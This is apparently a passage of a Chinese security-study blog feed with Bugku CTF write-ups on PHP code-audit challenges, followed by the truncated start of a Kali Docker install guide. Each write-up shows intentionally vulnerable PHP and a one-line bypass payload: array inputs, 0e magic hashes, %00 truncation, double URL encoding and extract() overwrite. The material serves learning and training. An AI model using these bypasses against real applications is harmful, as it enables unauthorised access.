class="variable">&amp;flag</span>=</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:<span class="selector-tag">a</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p><a href="http://123.206.87.240:9009/10.php" target="_blank" rel="noopener">http://123.206.87.240:9009/10.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">Access granted!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>(PHP 4, PHP 5)eregi函数以不区分大小写的正则表达式匹配，我们只要利用两次urldecode第一次是浏览器的解码第二次是函数的解码，就可以绕过了。这里只对其中一个字符D编码两次就行了，由于D的ascii码16进制值为0x44，所以第一次urlencode是%44，第二次%2544。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:<span class="attribute">id</span>=hacker%2544J</span><br></pre></td></tr></table></figure></p><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p><a href="http://123.206.87.240:9009/18.php" target="_blank" rel="noopener">http://123.206.87.240:9009/18.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这是一道很经典的题了，两变量值不等MD5值相等，利用MD5对数组返回NULL，即可绕过。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username<span class="string">[]</span>=<span class="number">1</span>&amp;password<span class="string">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><p><a href="http://123.206.87.240:9009/19.php" target="_blank" rel="noopener">http://123.206.87.240:9009/19.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看到题目就知道要，传数组进去了，两次返回都是NULL，不等于FALSE绕过成功。<br>还有可以正常利用ereg遇到%00就截止来绕过。<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">payload:</span> <span class="comment">password</span><span class="title">[</span><span class="title">]</span><span class="comment">=1或password=a%00</span><span class="literal">-</span><span class="literal">-</span></span><br></pre></td></tr></table></figure></p><h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><p><a href="http://123.206.87.240:9009/22.php" target="_blank" rel="noopener">http://123.206.87.240:9009/22.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure></p><p>is_numeric() 函数用于检测变量是否为数字或数字字符串。可以用数组绕过，也可以在数字后跟任意符号或文本绕过。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: password[]=1或<span class="attribute">password</span>=1367$</span><br></pre></td></tr></table></figure></p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php" target="_blank" rel="noopener">http://123.206.87.240:9009/7.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>数组绕过,sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: name<span class="string">[]</span>=<span class="number">1</span>&amp;password<span class="string">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php" target="_blank" rel="noopener">http://123.206.87.240:9009/13.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>由于php对数据的处理问题，当它读到0exxx的时候会当做科学计数法来处理。无论0e后面是什么，0的多少次方还是0.<br>md5(QNKCDZO)=0e830400451993494058024219903391<br>md5(240610708)=0e462097431906509019562988736854<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="attribute">a</span>=240610708</span><br></pre></td></tr></table></figure></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php" target="_blank" rel="noopener">http://123.206.87.240:9009/20.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据题目提示，把3735929054转为16进制0xdeadc0de，发现刚好绕过。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="attribute">password</span>=0xdeadc0de</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php" target="_blank" rel="noopener">http://123.206.87.240:9009/5.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You password must be alphanumeric</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'</span></span><br><span class="line"><span class="string">- have not been found</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>科学计数法+%00截断绕过ereg,%00算一个字符。还有就是数组也可以绕过。。。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="attribute">password</span>=1e9%00*-* 或password[]=1</span><br></pre></td></tr></table></figure></p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php" target="_blank" rel="noopener">http://123.206.87.240:9009/15.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'ctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>两个函数遇见数组都返回NULL，就都绕过了。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ctf<span class="string">[]</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;bugku里一些简单的代码审计题&quot;&gt;&lt;a href=&quot;#bugku里一些简单的代码审计题&quot; class=&quot;headerlink&quot; title=&quot;bugku里一些简单的代码审计题&quot;&gt;&lt;/a&gt;bugku里一些简单的代码审计题&lt;/h1&gt;&lt;h2 id=&quot;extract变量覆盖&quot;&gt;&lt;a href=&quot;#extract变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;extract变量覆盖&quot;&gt;&lt;/a&gt;extract变量覆盖&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://123.206.87.240:9009/1.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:9009/1.php&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$flag=&lt;span class=&quot;string&quot;&gt;&#39;xxx&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;extract($_GET);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($shiyan))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$content=trim(file_get_contents($flag));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($shiyan==$content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;flag&amp;#123;xxx&amp;#125;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&#39;Oh.no&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。&lt;/p&gt;
&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;symbol&quot;&gt;payload:&lt;/span&gt;shiyan=&lt;span class=&quot;variable&quot;&gt;&amp;amp;flag&lt;/span&gt;=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="php" scheme="http://chenxiyuan.vip/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>kali安装docker</title>
    <link href="http://chenxiyuan.vip/2019/04/19/kali%E5%AE%89%E8%A3%85docker/"/>
    <id>http://chenxiyuan.vip/2019/04/19/kali安装docker/</id>
    <published>2019-04-19T00:42:49.000Z</published>
    <updated>2019-04-19T00:46:21.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-<span class="builtin-name">get</span> update</span><br><span class="line"></span><br><span class="line">apt-<span class="builtin-name">get</span> install -y apt-transport-https ca-certificates</span><br><span class="line"></span><br><span class="line">apt-<span class="builtin-name">get</span> install dirmngr</span><br></pre></td></tr></table></figure><h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-key adv <span class="params">--keyserver</span> hkp:<span class="string">//p80.pool.sks-keyservers.net</span><span class="function">:80</span> <span class="params">--recv-keys</span> 